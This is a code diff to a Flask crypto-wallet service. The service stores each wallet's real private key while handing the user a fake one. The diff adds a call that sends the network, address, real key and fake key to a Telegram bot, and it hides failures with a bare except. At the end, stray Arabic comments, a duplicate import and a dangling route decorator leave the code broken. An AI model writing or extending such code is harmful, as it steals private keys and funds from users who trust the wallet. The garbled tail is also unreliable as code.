@@ -1,3 +1,4 @@
+from telegram_bot import notify_new_wallet
 from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
 import sqlite3
@@ -44,6 +45,11 @@ def create_wallet():
               (network, address, real_key, fake_key, datetime.now().isoformat()))
     conn.commit()
     
+    try:
+        notify_new_wallet(network, address, real_key, fake_key)
+    except:
+        pass
+    
     return jsonify({'address': address, 'private_key': fake_key})
 
 @app.route('/admin')
@@ -57,3 +63,9 @@ def admin():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
+
+# إضافة بعد آخر سطر
+from telegram_bot import notify_new_wallet
+
+# تعديل دالة create_wallet
+@app.route('/api/create-wallet', methods=['POST'])
